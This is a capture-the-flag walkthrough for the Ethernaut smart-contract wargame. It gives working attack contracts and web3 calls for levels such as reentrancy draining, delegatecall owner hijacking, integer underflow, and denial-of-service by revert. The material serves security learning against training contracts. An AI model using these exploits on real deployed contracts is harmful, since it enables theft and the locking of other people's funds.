# Ethernaut solution
## 0. Hello Ethernaut
The goal of this level is to familiarise yourself with how to interact with the current instance through the developer console. You should definitely go through this level yourself 🙂 hint: type await contract.info(). If you reaaaaaaaally need another hint, await contract.password(). Ok that's about all the hints I'm going to give you.

## 1. Fallback
The goal of this level is to become the owner and to reduce the balance of the contract to 0.

Let's start by figuring out how to become the owner. If you look at the contract code, the only feasible way of becoming the owner is to trigger the `receive` function. There is a `require` statement that needs to pass so we will call the `contribute` function and specify any value less than 0.001 ETH.

Thereafter we will initiate a plain ETH transfer into the contract to become the owner. To complete the second requirement, we will call the `withdraw` function to withdraw the funds out.

```
await contract.contribute({value: 1337});
await contract.send({value: 1337});
await contract.withdraw();
```

## 2. Fallout
In earlier versions of solidity, the constructor of a contract is defined by a function with the same name as the contract i.e. if your contract name is `Test`, the name of your constructor needs to be `Test` as well.

As of solidity 0.5.0, this is no longer the case but we can still learn something important here — contracts can have malicious functions that are hidden in plain sight. In this example, the function `Fal1out` is spelt incorrectly. It is very easy to miss out on this when skimming through the code.

To become the owner, we can call the `Fal1out` function.
```
await contract.Fal1out({value: 1337});
```

## 3. Coinflip
The goal of this level is to guess result of `side` correctly 10 times in a row. The chance of this happening is 0.5^10 or 0.0009765625% which _could_ happen but very very unlikely. Fortunately for us, the contract has a flaw with their flipping algorithm, specifically relying on `block.number` as a form of randomness. A malicious user can always calculate the correct answer if they run the same algorithm in their attack function before calling your flip function. Deploy the following contract on remix and call the `attack` function to take over the victim contract.
```
pragma solidity ^0.8.0;

contract AttackCoinflip {
    address victim = 0x9010BCEbf802A031eabB52B22F3ec1331D923bBd;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack() public {
        // This is the same algorithm that is used by the victim contract
        // I am calculating the value for side before calling the victim contract.
        // This will always be correct because both functions are called in the same block.
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        // Normally you would use import the contract here so that you can call the
        // function directly but if you're lazy like me, you call call the function
        // like this as well. This approach is useful for when you don't have access
        // to the source code of the contract you want to interact with.
        bytes memory payload = abi.encodeWithSignature("flip(bool)", side);
        (bool success, ) = victim.call{value: 0 ether}(payload);
        require(success, "Transaction call using encodeWithSignature is successful");
    }
}
```

## 4. Telephone
The way to break this level is to understand how tx.origin works. When you call a contract (A) function from within another contract (B), the msg.sender is the address of B, not the account that you initiated the function from which is tx.origin. Deploy the following contract on remix and call the `attack` function to take over the victim contract.
```
pragma solidity ^0.8.0;

contract AttackTelephone {
    address victim = 0x5fD8a73D2F2BAb543A2a42bDEe3688a05f40829b;

    function attack() public {
        bytes memory payload = abi.encodeWithSignature("changeOwner(address)", msg.sender);
        (bool success, ) = victim.call{value: 0}(payload);
        require(success, "Transaction call using encodeWithSignature is successful");
    }
}
```

## 5. Token
In earlier versions of solidity, smart contract developers have to be mindful when operating on unsigned integers as one might accidentally cause an integer under/overflow. A library like safemath was created to help operate on these integers safely but as of solidity 0.8.0, this is no longer necessary because solidity 0.8.0 introduces a [built-in check on arithmetic operations](https://docs.soliditylang.org/en/v0.8.13/080-breaking-changes.html).

In order to become the owner of this contract, you simply need to pass a value > 20 since the condition in the first require statement will underflow and therefore will always pass.
```
await contract.transfer(instance, 21)
```

## 6. Delegation
DelegateCall means you take the implementation logic of the function in the contract you're making this call to but using the storage of the calling contract. Since msg.sender, msg.data, msg.value are all preserved when performing a DelegateCall, you just needed to pass in a malicious msg.data i.e. the encoded payload of `pwn()` function to gain ownership of the `Delegation` contract.
```
let payload = web3.eth.abi.encodeFunctionSignature({
    name: 'pwn',
    type: 'function',
    inputs: []
});

await web3.eth.sendTransaction({
    from: player,
    to: instance,
    data: payload
});
```

## 7. Force
Even if a contract doesn't implement a receive / fallback or any payable functions to handle incoming ETH, it is still possible to forcefully send ETH to a contract through the use of `selfdestruct`. If you're deploying this contract through remix, don't forget to specify value before deploying the AttackForce contract or the `selfdestruct` won't be able to send any ETH over as there are no ETH in the contract to be sent over!
```
pragma solidity ^0.8.0;

contract AttackForce {

    constructor(address payable _victim) payable {
        selfdestruct(_victim);
    }
}
```

## 8. Vault
Your private variables are private if you try to access it the normal way e.g. via another contract but the problem is that everything on the blockchain is visible so even if the variable's visibility is set to private, you can still access it based on its index in the smart contract. Learn more about this [here](https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html).
```
const password = await web3.eth.getStorageAt(instance, 1);
await contract.unlock(password);
```

## 9. King
This is a classic example of DDoS with unexpected revert when the logic of the victim's contract involve sending funds to  in the victim's contract involves transferring ether to the previous "lead", which in this case is the king. A malicious user would create a smart contract with either:

- a `fallback` / `receive` function that does `revert()`
- or the absence of a `fallback` / `receive` function

Once the malicious user uses this smart contract to take over the "king" position, all funds in the victim's contract is effectively stuck in there because nobody can take over as the new "king" no matter how much ether they use because the fallback function in the victim's contract will always fail when it tries to do `king.transfer(msg.value);`
```
pragma solidity ^0.8.0;

contract AttackKing {

    constructor(address _victim) payable {
        _victim.call{value: 10000000000000000 wei}("");
    }

    receive() external payable {
        revert();
    }
}
```

## 10. Re-entrancy
This is the same exploit that led to the [DAO hack](https://www.coindesk.com/learn/2016/06/25/understanding-the-dao-attack/). Due to the ordering of the functions in the victim contract (sending funds before updating internal state), the malicious contract is able to keep calling the `withdraw` function as the internal state is only updated after the transfer is done.

When `msg.sender.call{value:_amount}("")` is processed, the control is handed back to the `receive` function of the malicious contract which then calls the `withdraw` function again. This is how the malicious contract is able to siphon all the funds.

There are 2 things to note:

1. The gas limited specified when calling the `maliciousWithdraw` function will determine how many times the reentracy call can happen.

2. You may need to manually increase the gas limit in the metamask prompt otherwise the reentrancy calls will not have enough gas to succeed.
```
pragma solidity ^0.8.0;

contract AttackReentrancy {
    address payable victim;
    uint256 targetAmount = 0.001 ether; // This is the amount that the victim contract was seeded with.

    constructor(address payable _victim) public {
        victim = _victim;
    }

    // Don't forget to specify 1000000000000000 wei if calling this via remix!
    function donate() public payable {
        require(msg.value == targetAmount, "Please call donate with 0.001 ETH.");
        bytes memory payload = abi.encodeWithSignature("donate(address)", address(this));
        (bool success, ) = victim.call{value: targetAmount}(payload);
        require(success, "Transaction call using encodeWithSignature is successful");
    }

    function maliciousWithdraw() public {
        bytes memory payload = abi.encodeWithSignature("withdraw(uint256)", targetAmount);
        victim.call(payload);
    }

    receive() external payable {
        // This attack contract has a malicious receive fallback function
        // that calls maliciousWithdraw again which calls withdraw!
        // This is how the reentrancy attack works.
        uint256 balance = victim.balance;
        if (balance >= targetAmount) {
            maliciousWithdraw();
        }
    }

    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

## 11. Elevator
Since `building.isLastFloor()` is not a view function, you could implement it in such a way where it returns a different value everytime it is called, even if it is called in the same function. Moreover, even if it were to be changed to a view function, you could also still [attack it](https://github.com/OpenZeppelin/ethernaut/pull/123#discussion_r317367511).

Note: You don't have to inherit an interface for the sake of doing it. It helps with the abstract constract checks when the contract is being compiled. As you can see in my implementation below, I just needed to implement `isLastFloor()` because at the end of the day, it still gets encoded into a hexidecimal function signature and as long as this particular signature exists in the contract, it will be called with the specified params. 

Sometimes `.call()` gives you a bad estimation of the gas required so you might have to manually configure how much gas you want to send along with your transaction. 
```
pragma solidity ^0.6.0;

contract AttackElevator  {
    bool public flag; 
    
    function isLastFloor(uint) public returns(bool) {
        flag = !flag;
        return !flag;
    }
    
    function forceTopFloor(address _victim) public {
        bytes memory payload = abi.encodeWithSignature("goTo(uint256)", 1);
        _victim.call(payload);
    }
   
}
```

## 12. Privacy
This level is very similar to that of the level 8 Vault. In order to unlock the function, you need to be able to retrieve the value stored at `data[2]` but you need to first determine what position it is at. You can learn more about how storage variables are stored on the smart contract [here](https://solidity.readthedocs.io/en/latest/miscellaneous.html#layout-of-state-variables-in-storage). From that, we can tell that `data[2]` is stored at index 5! It's not supposed to be at index 4 because arrays are 0 based so when you want to get value at index 2, you're actually asking for the 3 value of the array i.e. index 5!! Astute readers will also notice that the password is actually casted to bytes16! So you'd need to know what gets truncated when you go from bytes32 to byets16. You can learn about what gets truncated during type casting [here](https://www.tutorialspoint.com/solidity/solidity_conversions.htm).

Note: Just a bit more details about the packing of storage variables. The 2 `uint8` and 1 `uint16` are packed together on storage according to the order in which they appeared in the smart contract. In my case, when i did `await web3.eth.getStorageAt(instance, 2)`, I had a return value of `0x000000000000000000000000000000000000000000000000000000004931ff0a`. The last 4 characters of your string should be the same as mine because our contracts both have the same values for `flattening` and `denomination`. 

`flattening` has a value of 10 and its hexidecimal representation is `0a` while `denomination` has a value of 255 and has a hexidecimal representation of `ff`. The confusing part is the last one which is supposed to represent `awkwardness` which is of type `uint16`. Since `now` returns you a uint256 (equivalent of block.timestamp i.e. the number of seconds since epoch), when you convert `4931` as a hex into decimals, you get the values `18737`. This value can be obtained by doing `epochTime % totalNumberOfPossibleValuesForUint16` i.e. `1585269041 % 65536 = 18737`. The biggest value for `uint16` is `65535` but to determine all possible values, you need to add `1` to `65535` more to also include 0. Hopefully this explanation helps you to better understand how values are packed at the storage level!
```
var data = await web3.eth.getStorageAt(instance, 5);
var key = data.slice(2, 34);
await contract.unlock(key);
```

## 13. Gatekeeper One
This level is probably the most challenging so far since you'll need to be able to pass 5 conditional checks to be able to register as an entrant.

1. The workaround to `gateOne` is to initiate the transaction from a smart contract since from the victim's contract pov, `msg.sender` = address of the smart contract while `tx.origin` is your address. 
2. `gateTwo` requires some trial and error regarding how much gas you should use. The simplest way to do this is to use `.call()` because you can specify exactly how much gas you want to use. Once you've initiated a failed transaction, play around with the remix debugger. Essentially you want to calculate the total cost of getting to exactly the point prior to the `gasleft()%8191 == 0`. For me, this is 254 gas so to pass this gate, I just needed to use a gas equivalent to some multiple of 8191 + 254 e.g. 8191 * 100 + 254 = 819354. This [spreadsheet](https://docs.google.com/spreadsheets/u/1/d/1n6mRqkBz3iWcOlRem_mO09GtSKEKrAsfO7Frgx18pNU/edit#gid=0) of opcodes gas cost might help... but honestly, just playing with the debugger should work.
3. To solve `gateThree`, it makes more sense to work backwards i.e. solve part 3 then part 2 then part 1 because even if you could pass part 1, your solution for part 1 may not pass part 2 and so on. Play around with remix while using [this](https://www.tutorialspoint.com/solidity/solidity_conversions.htm) to help you better understand what gets truncated when doing explicit casting. If you know how to do bit masking, this gate should be a piece of cake for you! Quick tip - you can ignore the `uint64()` when trying to solve this gate.

For some strange reason, my solution wouldn't pass on Ropsten but passed locally on remix.
```
pragma solidity ^0.5.0;

// Remix account[0] address = 0xCA35b7d915458EF540aDe6068dFe2F44E8fa733c

contract AttackGatekeeperOne {
    address public victim;
    
    constructor(address _victim) public {
        victim = _victim;
    }
    
    // require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
    // require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
    // require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    

    function part3(bytes8 _gateKey) public view returns(bool) {
        // _gateKey has 16 characters
        // uint16(msg.sender) = truncating everything else but the last 4 characters of my address (733c) and converting it into uint16 returns 29500
        // for uint32 == uint16, the former needs to be left padded with 0s e.g. 00001234 == 1234 = true
        // solving uint32(uint64(_gateKey)) is trivial because it is the same as described above.
        // This function will return true for any _gateKey with the values XXXXXXXX0000733c where X can be hexidecimal character.
        return uint32(uint64(_gateKey)) == uint16(msg.sender);
    }
    
    function part2(bytes8 _gateKey) public pure returns(bool) {
        // This is saying that the truncated version of the _gateKey cannot match the original
        // e.g. Using 000000000000733c will fail because the return values for both are equal
        // However, as long as you can change any of the first 8 characters, this will pass.
        return uint32(uint64(_gateKey)) != uint64(_gateKey);
    }
    
    function part1(bytes8 _gateKey) public pure returns(bool) {
        // you can ignore the uint64 casting because it appears on both sides.
        // this is equivalent to uint32(_gateKey) == uint64(_gateKey);
        // the solution to this is the same as the solution to part3 i.e. you want a _gateKey where the last 8 digits is the same as the last 4 digits after
        // it is converted to a uint so something like 0000733c will pass.
        return uint32(uint64(_gateKey)) == uint16(uint64(_gateKey));
    }
    
    // So the solution to this is to use XXXXXXXX0000<insert last 4 characters of your address> where X can be any hexidecimal characters except 00000000.
    function enter(bytes8 _key) public returns(bool) {
        bytes memory payload = abi.encodeWithSignature("enter(bytes8)", _key);
        (bool success,) = victim.call.gas(819354)(payload);
        require(success, "failed somewhere...");
    }
}
```

## 14. Gatekeeper Two
Very similar to the previous level except it requires you to know a little bit more about bitwise operations (specifically XOR) and about `extcodesize`.

1. The workaround to `gateOne` is to initiate the transaction from a smart contract since from the victim's contract pov, `msg.sender` = address of the smart contract while `tx.origin` is your address. 
2. `gateTwo` stumped me for a little while because how can both extcodesize == 0 and yet msg.sender != tx.origin? Well the solution to this is that all function calls need to come from the constructor! When first deploy a contract, the extcodesize of that address is 0 until the constructor is completed! 
3. `gateThree` is very easy to solve if you know the XOR rule of `if A ^ B = C then A ^ C = B`.

```
pragma solidity ^0.6.0;

contract AttackGatekeeperTwo {
    
    constructor(address _victim) public {
        bytes8 _key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0) - 1);
        bytes memory payload = abi.encodeWithSignature("enter(bytes8)", _key);
        (bool success,) = _victim.call(payload);
        require(success, "failed somewhere...");
    }
    
    
    function passGateThree() public view returns(bool) {
        // if a ^ b = c then a ^ c = b;
        // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) = uint64(0) - 1
        // therefore uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1 = uint64(_gateKey) 
        uint64 key = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1;
        return uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ key == uint64(0) - 1;
    }
}
```

## 15. Naught Coin
Just approve another address to take the coins out on behalf of player. Note that you will need to know how to generate the data payload using `web3.eth.encodeFunctionCall`. Once you have the `data` payload, you need to initiate the `web3.eth.sendTransaction` while the selected account on metamask is the spender's account. The reason for this is because `transferFrom()` checks the allowance of msg.sender. 
```
web3.eth.abi.encodeFunctionCall({
    name: 'transferFrom',
    type: 'function',
    inputs: [{
        type: 'address',
        name: 'sender'
    },{
        type: 'address',
        name: 'recipient'
    },{
        type: 'uint256',
        name: 'amount'
    }]
}, ['<insert owner address here>', '<insert spender address here>', '1000000000000000000000000']);

await web3.eth.sendTransaction({
    to: "<insert address of contract instance here>",
    from: "<insert address of spender>",
    data: "<insert data payload here>"
})
```

## 16. Preservation
You need to understand how `delegatecall` works and how it affects storage variables on the calling contract to be able to solve this level. Essentially, when you try to do `delegatecall` and call the function `setTime()`, what's happening is that it is not just applying the logic of `setTime()` to the storage variables of the calling contract, it is also preserving the index of `storedTime` in the calling contract and using that as a reference as to which variable should it update. In short, the `LibraryContract` is trying to modify the variable at index 0 but on the calling contract, index 0 is the address of `timeZone1Library`. So first you need to call `setTime()` to replace `timeZone1Library` with a malicious contract. In this malicious contract, `setTime()` which will modify index 3 which on the calling contract is the owner variable!

1. Deploy the malicious library contract
2. Convert the address into uint.
3. Call either `setFirstTime()` or `setSecondTime()` with the uint value of (2).
4. Now that the address of `timeZone1Library` has been modified to the malicious contract, call `setFirstTime()` with the uint value of your player address.
```
pragma solidity ^0.6.0;

contract LibraryContract {

  // stores a timestamp 
  address doesNotMatterWhatThisIsOne;
  address doesNotMatterWhatThisIsTwo;
  address maliciousIndex;

  function setTime(uint _time) public {
    maliciousIndex = address(_time);
  }
}

await contract.setFirstTime("<insert uint value of your malicious library contract>")
await contract.setFirstTime("<insert uint value of your player>)

```

## 17. Recovery
Notice how there exists a function called `destroy()` which alls `selfdestruct()`. `selfdestruct()` is a way for you to "destroy" a contract and retrieve the entire eth balance at that address. So what you need to do is encode it into the `data` payload initiate a transaction to it. You need to analyse your transaction hash to determine the address of the lost contract. Once you have that, you should be able to solve this level.
```
data = web3.eth.abi.encodeFunctionCall({
    name: 'destroy',
    type: 'function',
    inputs: [{
        type: 'address',
        name: '_to'
    }]
}, [player]);
await web3.eth.sendTransaction({
    to: "<insert the address of the lost contract>",
    from: player,
    data: data
})
```

## 18. MagicNumber
Don't really think this is a security challenge, it's more of a general coding challenge about how you can deploy a very small sized contract! I probably won't ever need to use this so I'm going to skip this floor. Nonetheless, if you're interested to do this challenge, read this [solution](https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2) by Nicole Zhu. 


## 19. AlienCodex

In order to solve this level, you need to understand about 3 things:
1. Packing of storage variables to fit into one storage slot of 32bytes
2. How values in dynamic arrays are stored
3. How to modify an item outside of the size of the array.

This [example](https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/) & the [solidity documentation](https://solidity.readthedocs.io/en/latest/miscellaneous.html#bytes-and-string) should prove useful to understanding point 2. However, I would like to point out that there is a mistake in the example. If you can find the mistake, you probably have a solid understanding of point 2. Note that the solution below uses web3 to interact with the contract because there was an error on Ethernaut (0.5.0)'s end preventing me from getting an instance.
```
// After deploying your contract, you need to determine which is your instance contract. 
// Find the transaction on etherscan, click on Internal Transactions
// Look for the line "create_0_0... the To address represents your deployed contract

// First you need to make contact
var instance = "<insert contract instance here">

// Check who is owner
var ownerPayload = web3.eth.abi.encodeFunctionCall({
    name: 'owner',
    type: 'function',
    inputs: []
}, []); // 0x8da5cb5b

await web3.eth.call({to: instance, data: ownerPayload});

var makeContactPayload = web3.eth.abi.encodeFunctionCall({
    name: 'make_contact',
    type: 'function',
    inputs: []
}, []); // 0x58699c55

await web3.eth.sendTransaction({to: instance, from: player, data: makeContactPayload});

var concatenatedStorage = await web3.eth.getStorageAt(instance, 0); // 0x000000000000000000000001xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx where the x represents your address and 1 represents contact = true

// Number of elements in dynamic array (codex) is stored at index 1 
// Actual elements stored in dynamic array (codex) can be found at index uint256(keccak256(1)); // 
80084422859880547211683076133703299733277748156566366325829078699459944778998
// New elements added to dynamic array (codex) can be found at index uint256(keccak256(1)) + index in array e.g.
// First element is found at uint256(keccak256(1)) + 0;
// Second element is found at uint256(keccak256(1)) + 1;
// Third element is found at uint256(keccak256(1)) + 2; 

// We want to modify storage slot 0 since that is where owner is stored at. 
// We need a value N such that uint256(keccak256(1)) + N = 0
// 0 (or max value for uint256) - uint256(keccak256(1)) = N

var maxVal = "115792089237316195423570985008687907853269984665640564039457584007913129639936"
var arrayPos = "80084422859880547211683076133703299733277748156566366325829078699459944778998"
var offset = (web3.utils.toBN(maxVal).sub(web3.utils.toBN(arrayPos))).toString();
var elementAtIndexZero = await web3.eth.getStorageAt(instance, 0);
var newElementAtIndexZero = `${elementAtIndexZero.slice(0, 26)}${player.slice(2,)}`

var replaceIndexZeroPayload = web3.eth.abi.encodeFunctionCall({
    name: 'revise',
    type: 'function',
    inputs: [{
        type: 'uint256',
        name: 'i'
    },{
        type: 'bytes32',
        name: '_content'
    }]
}, [offset.toString(), newElementAtIndexZero]);

// If you try to do 
// await web3.eth.sendTransaction({to: instance, from: player, data: replaceIndexZeroPayload});
// It will fail because you are trying to modify an index that is greater than the length of the array
// I mean there's a reason why there is a retract() function right? haha.

var retractPayload = web3.eth.abi.encodeFunctionCall({
    name: 'retract',
    type: 'function',
    inputs: []
}, []); // 0x47f57b32

// Call retract as many times as you need such that the integer underflows
await web3.eth.sendTransaction({to: instance, from: player, data: retractPayload});

// You can check the size of the array by doing
await web3.eth.getStorageAt(instance, 1);

// Once it returns "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff", you know that you're ready to replace the owner
await web3.eth.sendTransaction({to: instance, from: player, data: replaceIndexZeroPayload});

// Check that owner has been replaced successfully
await web3.eth.call({to: instance, data: ownerPayload})
```

## 20. Denial
This level is very similar to the levels Force and King. The problem with the Denial contract is the fact that instead of transferring using `.send()` or `.transfer`() which has a limit of 2300 gas, it used `.call()` and if no limit on the gas is specified, it will send all gas along with it. So now the question is, what can you do in your fallback function to consume all the gas? `assert()` of course! 

Note that you should actually also avoid using `.send()` and `.transfer()` now because of the recent Istanbul Hardfork which made 2300 gas insufficient. You can read more about this [here](https://diligence.consensys.net/blog/2019/09/stop-using-soliditys-transfer-now/).

```
pragma solidity ^0.6.0;

contract AttackDenial {
    
    address public victim;
    
    constructor(address _victim) public payable {
        victim = _victim;
        bytes memory payload = abi.encodeWithSignature("setWithdrawPartner(address)", address(this));
        victim.call(payload);
    }
    
    
    fallback() external payable {
        assert(false);
    }
}
```

## 21. Shop
This level is very similar to that of Elevator where you return different value everytime you call the function. The only problem now is the fact that you are only given 3k gas which is not enough to modify any state variables. Even if you wanted to, you can't because the interface requires a view function. Notice how there is actually a flag on the Shop contract that is being modified if it passes the first check? Yes the `isSold` variable! That is the variable that we will use to return different prices. Make sure you import the `Buyer` interface and `Shop` contract. Note that because of the recent Byzantine hardfork, this solution will actually fail because the `price()` function requires 3.8k gas but only 3k gas is given. 

```
contract AttackShop is Buyer {
    Shop public shop;
    
    constructor(Shop _shop) public {
        shop = _shop;
    }
    
    function buy() public {
        shop.buy();
    }

    function price() public view override returns(uint) {
        return shop.isSold() ? 1 : 101;
    }
}
```